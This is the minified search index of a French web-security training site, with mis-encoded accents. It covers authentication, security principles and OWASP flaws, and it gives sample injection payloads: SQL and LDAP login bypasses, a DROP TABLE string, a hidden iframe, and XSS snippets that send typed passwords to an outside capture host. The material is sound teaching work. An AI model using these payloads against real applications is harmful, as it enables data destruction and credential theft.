var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(n){const s=suggestions.classList.contains("d-none");if(s)return;const e=[...suggestions.querySelectorAll("a")];if(e.length===0)return;const t=e.indexOf(document.activeElement);if(n.key==="ArrowUp"){n.preventDefault();const s=t>0?t-1:0;e[s].focus()}else if(n.key==="ArrowDown"){n.preventDefault();const s=t+1<e.length?t+1:t;e[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/authentification/",title:"Authentification",description:"",content:""}).add({id:1,href:"/docs/authentification/principes/",title:"Les grands principes de l'authentification",description:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ?",content:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ? Ou dÃ©connexion de l\u0026rsquo;application et du fournisseur d\u0026rsquo;identitÃ© ? Ou encore, de l\u0026rsquo;application, du fournisseur, et de toutes les autres applis s\u0026rsquo;Ã©tant connectÃ©es via le fournisseur ?    Annuaire # RÃ©fÃ©rentiel permettant de stocker des donnÃ©es de maniÃ¨re hiÃ©rarchique et offrant des mÃ©canismes pour rechercher efficacement l\u0026rsquo;information.\n Recensement des informations sur les utilisateurs, sur les applications, sur un parc informatique Authentifier un utilisateur Donner un droit d\u0026rsquo;un objet sur un autre, gestion de groupes (hierarchie)  Technologies d\u0026rsquo;annuaires #  OpenLDAP : projet opensource Active Directory (AD) : solution Microsoft.  Ressource authentifiÃ© # Les besoins d\u0026rsquo;authentification sont variÃ©s.\nUne application peut proposer :\n Du contenu public (donc sans authentification) Du contenu accessible Ã  n\u0026rsquo;importe quel utilisateur authentifiÃ© Du contenu accessible Ã  certains utilisateurs  Ressource authentifiÃ© #  Authentification explicite : je prÃ©sente un en-tÃªte \u0026ldquo;Authorization\u0026rdquo; dans ma requÃªte Authentification implicite : je m\u0026rsquo;attends Ã  ce que l\u0026rsquo;application me donne un moyen de m\u0026rsquo;authentifier  Ressource authentifiÃ© # En arrivant sur une page oÃ¹ je suis censÃ© Ãªtre authentifiÃ©\n Je prÃ©sente un header \u0026ldquo;Authorization\u0026rdquo; ? Si oui et que l\u0026rsquo;application l\u0026rsquo;accepte je suis authentifiÃ© Sinon, l\u0026rsquo;application peut me proposer des moyens de m\u0026rsquo;authentifier S\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autres moyens que le header Authorization ou que j\u0026rsquo;ai dÃ©jÃ  tentÃ© tous les modes possibles sans succÃ¨s, je reÃ§ois dÃ©finitivement une erreur 401 \u0026ldquo;Unauthorized\u0026rdquo;  Ressource authentifiÃ© # Si un ou plusieurs autre modes de connexion sont disponibles, les fonctionnements sont variÃ©s :\n 401 + WWW-Authenticate header : le navigateur doit savoir rÃ©agir 200 + traitements divers ou 30X : redirection vers page de login ou vers un fournisseur d\u0026rsquo;identitÃ©  Ressource authentifiÃ© #  Exemple : l\u0026rsquo;authentification Basic  Authorization: Basic Base64(identifiant:motdepasse)   Si un site propose l\u0026rsquo;authentification Basic, et que l\u0026rsquo;on vient sans l\u0026rsquo;entÃªte authorisation, le site rÃ©pond avec l\u0026rsquo;entÃªte :  WWW-Authenticate: Basic realm=\u0026quot;nom d'affichage\u0026quot;   Le navigateur voyant cet entÃªte affiche Ã  l\u0026rsquo;utilisateur une pop-up demandant un identifiant et mot de passe et ayant pour titre le \u0026ldquo;nom d\u0026rsquo;affichage\u0026rdquo; Le navigateur utilisera ce couple identifiant mot de passe pour former l\u0026rsquo;en-tÃªte Authorisation tout le reste de la session  Ressource authentifiÃ© # Je suis correctement identifiÃ© mais la ressource ne s\u0026rsquo;adresse qu\u0026rsquo;Ã  un certain type d\u0026rsquo;utilisateur dont je ne fais pas partie :\n Erreur 403 Forbidden  Rappel code rÃ©ponse HTTP : #  20X : succÃ¨s 30X : redirection 40X : erreur cÃ´tÃ© Client Web 50X : erreur cÃ´tÃ© Serveur Web  Rappel code rÃ©ponse HTTP : #  200 : OK 301 : Moved Permanently 302 : Found (DÃ©placÃ© temporairement) 400 : Bad Request 401 : Unauthorized 403 : Forbidden 404 : Not Found 418 : Iâ€™m a teapot (RFC 2324) 500 : Internal Server Error 503 : Service Unavailable : rÃ©ponse fournie par un reverse proxy si l\u0026rsquo;application n\u0026rsquo;est pas disponible (maintenance par exemple)  Rappel code rÃ©ponse HTTP : # 401 ou 403 ?\n 401 : Unauthorized : L\u0026rsquo;authentification ne s\u0026rsquo;est pas dÃ©rolÃ©e comme prÃ©vue ou elle s\u0026rsquo;est bien dÃ©roulÃ©e mais l\u0026rsquo;utilisateur est inconnu de l\u0026rsquo;application 403 : Forbidden : L\u0026rsquo;authentification s\u0026rsquo;est bien dÃ©roulÃ©e et l\u0026rsquo;utilisateur est connu mais il n\u0026rsquo;a pas les habilitations nÃ©cessaires  Comment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut simplement prÃ©senter une identifiation. C\u0026rsquo;est alors Ã  moi de dÃ©terminer si l\u0026rsquo;utilisateur a le droit d\u0026rsquo;accÃ©der Ã  la ressource et d\u0026rsquo;afficher les bonnes informations.\nM Robichu se connecte Ã  mon questionnaire en ligne.\nIl a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, la seule information connue de l\u0026rsquo;application est alors son identifiant.\nL\u0026rsquo;application recherche en base de donnÃ©es l\u0026rsquo;identifiant de M Robichu et rÃ©cupÃ¨re bien une ligne qui contient notamment les informations dÃ©jÃ  renseignÃ©es par M Robichu.\nJe sais donc que M Robichu a les droits sur l\u0026rsquo;application et je peux en plus prÃ©remplir le questionnaire avec ce que je sais dÃ©jÃ \nComment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut fournir une rÃ©ponse plus complÃ¨te contenant des rÃ´les. Je peux alors me servir de ces rÃ´les rÃ©cupÃ©rÃ©s pour gÃ©rer l\u0026rsquo;accÃ¨s Ã  mes ressources.\nM Robichu se connecte Ã  mon questionnaire en ligne.\n*Il a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, les informations connues de l\u0026rsquo;application sont maintenant son identifiant mais aussi une liste de rÃ´les dont \u0026ldquo;repondant-enquete-satisfaction-joint-etancheite-climatiseur-morgue\u0026rdquo;. *\nJe sais directement que M Robichu a les droits sur l\u0026rsquo;application. Mais rien ne m\u0026rsquo;empÃªche de chercher en base de donnÃ©es des informations plus prÃ©cises sur M Robichu\nComment savoir si l\u0026rsquo;utilisateur a les droits ? # RÃ´les dans l\u0026rsquo;authentification ou en base de donnÃ©es ?\nSe limiter au rÃ´les le plus brut possible dans le systÃ¨me d\u0026rsquo;authentification (rÃ©pondant, administrateur)\nÃ‰viter de trop spÃ©cifier le rÃ´le surtout si l\u0026rsquo;on possÃ¨de l\u0026rsquo;information en base de donnÃ©es. (rÃ©pondant Ã  l\u0026rsquo;enquÃªte X, Ã  l\u0026rsquo;enquÃªte Y, etc.)\nQuelques exemples d\u0026rsquo;authentification # Authentifications directes :\n Basic Formulaire Certificat Client Kerberos : adaptÃ© au Web par SPNEGO, Simple and Protected GSSAPI (Generic Security Services Application Program Interface) Negotiation Mechanism, implÃ©mentÃ© par AD NTLM (NT Lan Manager) : SystÃ¨mes Windows ou compatible AD  Authentifications centralisÃ©es nÃ©cessitant l\u0026rsquo;utilisation d\u0026rsquo;un autre mode :\n SAML OpenID Connect  Kerberos # WWW-Authenticate: Negociate\n SystÃ¨me d\u0026rsquo;Ã©change de jeton basÃ© sur des clÃ©s symÃ©triques (dÃ©duites des mots de passes)  https://blog.devensys.com/kerberos-principe-de-fonctionnement/\nNTLM # Kerberos simplifiÃ© et moins sÃ©curisÃ©\nWWW-Authenticate: NegociateNTLM\n Envoi de l\u0026rsquo;identifiant Challenge du serveur, Ã  rÃ©soudre avec le hash du mot de passe Le serveur demande Ã  AD de valider (identifiant,challenge, rÃ©ponse du client) AD rÃ©pond au serveur si l\u0026rsquo;authentification est OK  Authentifications Kerberos ou NTLM : SÃ©curitÃ© #  Afin de contrÃ´ler ce flux, les sources autorisÃ©es Ã  Ã©mettre une demande de challenge sont contrÃ´lÃ©es Dans Firefox, il s\u0026rsquo;agit des propriÃ©tÃ©s suivantes (about:config)  network.negotiate-auth.delegation-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.negotiate-auth.trusted-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.automatic-ntlm-auth.trusted-uris :  Plus d\u0026rsquo;informations : https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication\nConfidentialitÃ© de l\u0026rsquo;authentification #  Kerberos, NTLM, SAML : SÃ©curitÃ© intrinsÃ¨que (mÃªme sur un canal en clair, une lecture rÃ©seau ne permet pas d\u0026rsquo;obtenir des informations sur les credentials de l\u0026rsquo;utilisateur) Certificat client : Ã‰tape du protocole HTTPS Formulaire, Basic, OIDC : SÃ©curitÃ© basÃ©e sur un canal chiffrÃ© (HTTPS)  Utilisation d\u0026rsquo;une fÃ©dÃ©ration d\u0026rsquo;identitÃ© #  On verra le fonctionnement en dÃ©tail plus tard (SAML, OpenIDConnect) Principe : dÃ©lÃ©guer l\u0026rsquo;authentification Ã  un autre systÃ¨me (Kerberos et NTLM sont au fond des fÃ©dÃ©rations d\u0026rsquo;identitÃ©) IntÃ©rÃªts :  Authentification centralisÃ©e Ã‰viter les accÃ¨s directs aux annuaires SSO AmÃ©lioration de la sÃ©curitÃ© : la sÃ©curitÃ© est Ã©galement dÃ©lÃ©guÃ©e au protocole et au systÃ¨me authentifiant, reduction de la surface d\u0026rsquo;attaque Cependant la sÃ©curitÃ© du client reste Ã  la charge des applications    "}).add({id:2,href:"/docs/https/",title:"Https",description:"",content:""}).add({id:3,href:"/docs/failles/",title:"Failles applicatives",description:"",content:""}).add({id:4,href:"/docs/intro/",title:"Introduction",description:"",content:""}).add({id:5,href:"/docs/intro/grands-principes/",title:"Les grands principes de la sÃ©curitÃ©",description:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.",content:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.)  ðŸ‘‰  L'intÃ©gritÃ© est trÃ¨s difficilement dissociable de la confidentialitÃ©  Une appli sans HTTPS n'est plus envisageable aujourd'hui    Un kit de survie du HTTPS sera abordÃ© dans la partie HTTPS de la formation. Il s\u0026rsquo;agit de connaitre les principes de base, afin de pouvoir aprÃ©hender les principales erreurs relative Ã  une configuration HTTPS.\n Authentification #  Une opÃ©ration n\u0026rsquo;est accessible qu\u0026rsquo;Ã  ceux qui sont censÃ© rÃ©aliser l\u0026rsquo;opÃ©ration Prouver qu\u0026rsquo;on est celui qu\u0026rsquo;on dÃ©clare Ãªtre  On parle de facteurs d\u0026rsquo;authentification pour chaque preuve que l\u0026rsquo;on peut aborder\n Ce que je sais : mot de passe Ce que je possÃ¨de : certificat, carte Ã  puce, badge Ce que je suis : empreinte digitale, rÃ©tinienne   Une grande partie de cette formation se focalise sur les enjeux et les moyens concret de mettre en place une authentification sur son application\n TraÃ§abilitÃ© #  ÃŠtre capable de savoir ce qui s\u0026rsquo;est passÃ© sur un serveur et par qui Avoir un systÃ¨me de logs,\u0026hellip; Connaitre son sytÃ¨me de logs !!! Avoirs des moyens efficace de rechercher une information dans ses logs   Ne sera pas abordÃ© dans cette formation, mais reste une Ã©tape indispensable Ã  la reflexion de la sÃ©curitÃ© de son application. Le jour on aura besoin de savoir ce qu\u0026rsquo;il s\u0026rsquo;est passÃ©, ce sera trop tard pour y penser\u0026hellip;\n Non rÃ©pudiation #  Un utilisateur ne peut nier une action effectuÃ©e \u0026ldquo;Signature d\u0026rsquo;un contrat\u0026rdquo; Principe de la signature Ã©lectronique   Hors scope de cette formation\n Pour aller plus loin #  Auto-formation aux grands concepts de la sÃ©curitÃ© par l\u0026rsquo;ANSSI : https://www.secnumacademie.gouv.fr/  "}).add({id:6,href:"/docs/failles/intro/",title:"Qu'est ce qu'une faille applicative ?",description:"Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.",content:" Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.\n  Les failles applicatives peuvent Ãªtre causÃ©es par une mauvaise conception de l\u0026rsquo;application, des erreurs de programmation, des problÃ¨mes de configuration ou des erreurs humaines. Certaines des vulnÃ©rabilitÃ©s les plus courantes comprennent les injections SQL, les attaques de scripts entre sites (XSS), les attaques de falsification de demande intersite (CSRF), les failles d\u0026rsquo;authentification, les failles de contrÃ´le d\u0026rsquo;accÃ¨s, les erreurs de validation de donnÃ©es, etc.\n  Il est important pour les dÃ©veloppeurs et les Ã©quipes de sÃ©curitÃ© informatique de dÃ©tecter et de corriger rapidement les failles applicatives pour Ã©viter que des attaquants ne profitent de ces vulnÃ©rabilitÃ©s. Les tests de sÃ©curitÃ© rÃ©guliers, les examens de code et les audits de sÃ©curitÃ© sont des moyens courants de dÃ©tection et de correction des failles applicatives.\n Grandes catÃ©gories :\n Une erreur de conception ? Une erreur de configuration ? Une erreur de programmation (bug, fonctionnalitÃ© mal implÃ©mentÃ©e) ?  Une erreur de conception ? # Cas 1 :\nSoit une plateforme de rÃ©servation en ligne pour des chambres d\u0026rsquo;hÃ´tel.\nJe propose aux utilisateurs d\u0026rsquo;annuler leurs commandes jusqu\u0026rsquo;Ã  16 h.\nUn concurrent peut facilement pourrir mon hÃ´tel en rÃ©servant toutes les chambres et en les annulant Ã  15h55.\nEst ce que cela fait partie du fonctionnement normal ?\nCas 2 :\nSur mon web service de gestion d\u0026rsquo;annuaire, on peut crÃ©er autant d\u0026rsquo;habilitations que l\u0026rsquo;on veut pour un contact\nAu delÃ  d\u0026rsquo;environ 300 habilitations c\u0026rsquo;est l\u0026rsquo;annuaire qui finit par planter\u0026hellip;\nProblÃ©matiques Ã  la conception :\n S\u0026rsquo;assurer que par design certains processus ne seront pas forcÃ©ment soumis Ã  des instabilitÃ©s ConnaÃ®tre les limites de son systÃ¨me  Une erreur de configuration ? # Quelques exemples :\n L\u0026rsquo;application n\u0026rsquo;est pas proposÃ©e et forcÃ©e en HTTPS Flux trop large en entrÃ©e (par exemple possiblitÃ© de connexion sur ports d\u0026rsquo;administration ou base de donnÃ©es exposÃ©e) Secrets exposÃ©s BibliothÃ¨ques Ã  jour mais avec une configuration permettant de faire n\u0026rsquo;importe quoi (mode.debug=true ou conf.developpement=true) \u0026hellip;  Une erreur de programmation ? #  Son propre code Le code des autres, dit autrement les bibliothÃ¨ques utilisÃ©es : NÃ©cÃ©ssitÃ© de mise Ã  jour rÃ©guliÃ¨re !  Le top 10 des vulnÃ©rabilitÃ©s : OWASP\nhttps://owasp.org/www-project-top-ten/\n A1 : Acceder Ã  une ressource non prÃ©vue :  Mauvaise gestion des droits En forcant un utilisateur privilÃ©giÃ© Ã  cliquer sur l\u0026rsquo;action souhaitÃ©e = XSS y compris injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; Vol de session : consÃ©quence de XSS et d\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo;   A2 : Ne pas ou mal utiliser un canal chiffrÃ©  Protocoles obsolÃ¨tes, contrÃ´les non effectuÃ©s HTTPS non obligatoire      A3 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;  Faire Ã©xÃ©cuter du code non prÃ©vu en particulier directement sur la base de donnÃ©es   A4 : Erreur de conception  La meilleure des implÃ©mentations ne corrigera pas   A5 : Erreur de configuration A6 : BibliothÃ¨ques pas Ã  jour (ou utilisation de bibliothÃ¨ques abandonnÃ©es)  Bugs des \u0026ldquo;autres\u0026rdquo;      A7 : Failblesses d\u0026rsquo;authentification  PossibilitÃ© de brute force Mots de passe faibles ou trop standards DÃ©connexions et invalidation de session mal gÃ©rÃ©s   A8 : Non controles d\u0026rsquo;intÃ©gritÃ©  DonnÃ©es entrantes (au run) BibliothÃ¨ques vÃ©rolÃ©es (au build)      A9 : DÃ©faut de tracabilitÃ©  Logs inexploitables Impossible de savoir clairement qui a fait quoi et quand   A10 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;, vision rÃ©seau  SÃ©curitÃ© en profondeur, cloisonnement rÃ©seau Comptes applicatif Ã  droits limitÃ©s     Les vulnÃ©rabilitÃ©s concrÃ¨tement ! #   https://imgs.xkcd.com/comics/exploits_of_a_mom.png --  L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passÃ© ?\n Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n   L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passÃ© ?\npublic void inscrireEleve(String prenom){ String maRequeteSQL = \u0026quot;INSERT INTO Students VALUES ('\u0026quot; + prenom + \u0026quot;')\u0026quot;; connectionSql.createStatement().executeQuery(maRequeteSQL); }   L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passÃ© ?\n Si on remplit dans le formulaire Robert'); DROP TABLE Students;-- La requÃ¨te envoyÃ©e au serveur devient :  INSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; : SQL ou LDAP # Pourquoi ?\n Consulter des donnÃ©es confidentielles AltÃ©rer la base de donnÃ©es   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; # Exemple en SQL # \u0026quot;SELECT * FROM USER WHERE identifiant='\u0026quot; + username + \u0026quot;' AND password='\u0026quot; + password + \u0026quot;'\u0026quot;;  Ã  renseigner avec username=robichu et password=' OR '1'='1' -- pour se connecter en tant que M Robichu\n L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; # Exemple en LDAP # \u0026quot;(\u0026amp;(uid = \u0026quot; + user_name + \u0026quot;) (userpassword = \u0026quot; + user_password + \u0026quot;))\u0026quot;;  Ã  renseigner avec username=robichu)(\u0026amp;) pour se connecter en tant que M Robichu\n L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; : SQL ou LDAP # SÃ©curitÃ© :\n Ã‰chapper les caractÃ¨res spÃ©ciaux =\u0026gt; Utiliser des PreparedStatement =\u0026gt; Utiliser des Frameworks qui font le boulot (hibernate, \u0026hellip;) Et que l\u0026rsquo;on garde Ã  jour bien entendu   Vous avez GagnÃ© # Cliquez la\n  Vous avez GagnÃ© # Cliquez la\n   Les attaques basÃ©es sur des croisements de domaines #   Un utilisateur connectÃ© sur un site lÃ©gitime envoie des donnÃ©es Ã  un site attaquant Un site attaquant force un utilisateur Ã  faire une opÃ©ration non souhaitÃ© sur le site lÃ©gitime   Les \u0026lt;iframe\u0026gt; #  Principe lÃ©gitime Ã  la base : afficher une page web sur une autre page web Comportements dÃ©tournÃ©s Clickjacking = on cache une iframe par dessus un bouton aparemment lÃ©gitime  \u0026lt;iframe style=\u0026quot;opacity: 0\u0026quot; src=\u0026quot;https://le-site-des-admins\u0026quot;\u0026gt;   XFS #  XFS ou Cross Frame Scripting : principe gÃ©nÃ©ral d\u0026rsquo;attaque consistant Ã  injecter le site lÃ©gitime sur le site du pirate via un iframe    Protection  DÃ©clarative uniquement = on va dire au navigateur que le site n\u0026rsquo;a aucune raison lÃ©gitime d\u0026rsquo;Ãªtre dans une iframe Des entÃªtes standards existent :  X-Frame-Options:\u0026lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/\u0026gt;;   On filtre donc les origines qui ont le droit d\u0026rsquo;afficher l\u0026rsquo;iframe /!\\ Absence d\u0026rsquo;entÃªte = autorisÃ© de n\u0026rsquo;importe quel source     L\u0026rsquo;injection de code\u0026hellip; cÃ´tÃ© client ! #  Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n   L\u0026rsquo;injection de code\u0026hellip; cÃ´tÃ© client ! # Et si j\u0026rsquo;Ã©crit dans le formulaire :\n\u0026lt;form action=\u0026quot;https://securite-applicative.free.beeceptor.com\u0026quot; \u0026gt;Entrez votre mot de passe : \u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; formtarget=\u0026quot;_blank\u0026quot;\u0026gt;Me connecter\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;  Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative\n L\u0026rsquo;injection de code\u0026hellip; cÃ´tÃ© client ! # DÃ©clinable Ã  souhait\u0026hellip;\n\u0026lt;button onclick=\u0026quot;window.location='https://securite-applicative.free.beeceptor.com'\u0026quot; \u0026gt;Continuer\u0026lt;/button\u0026gt;   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; # On peut forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action\n En le redirigeant sur la page avec des paramÃ¨tres de requete trafiquÃ©s En stockant en base un code qui va Ãªtre rÃ©affichÃ©   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; #  On peut ainsi rajouter ce genre de code sur la page de l\u0026rsquo;utilisateur  \u0026lt;script\u0026gt;document.location=\u0026quot;https://no.domain\u0026quot;\u0026lt;/script\u0026gt;  \u0026lt;script\u0026gt; document.getElementsByTagName(\u0026quot;body\u0026quot;)[0].innerHTML(\u0026quot; \u0026lt;form action='https://no.domain' \u0026gt; \u0026lt;br\u0026gt;Connectez vous !\u0026lt;br\u0026gt; \u0026lt;input type='text' name='email'\u0026gt; \u0026lt;input type='password' name='mot de passe'\u0026gt; \u0026lt;input type='submit' value='Connexion'\u0026gt; \u0026lt;/form\u0026gt; \u0026quot;) \u0026lt;/script\u0026gt;   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; : XSS (Cross-Site Scripting) #  Pourquoi ? #  Vol de donnÃ©es, en particulier des cookies de session (explications) Redirection malveillante   Comment ? #  Consiste Ã  injecter du code et en particulier des script dans une page web (donc Ã©xÃ©cutÃ© par l\u0026rsquo;utilisateur dans son navigateur) L\u0026rsquo;attaquant fournit une requÃªte vers un site lÃ©gitime mais dont le contenu injecte le code L\u0026rsquo;attaquant peut aussi profiter d\u0026rsquo;une non validation des donnÃ©es persistantes (BDD)   Types de XSS #  Injection \u0026ldquo;en direct\u0026rdquo; par le serveur, on parle de reflected XSS On l\u0026rsquo;appelle DOM XSS, si elle consiste Ã  modifier le DOM via un script Pire, XSS Stored : le pirate arrive Ã  Ã©crire ce code dans une base de donnÃ©es ou dans un fichier local. Il n\u0026rsquo;a mÃªme plus besoin de fournir un lien trafiquÃ© Ã  l\u0026rsquo;utilisateur.   SÃ©curitÃ© : #  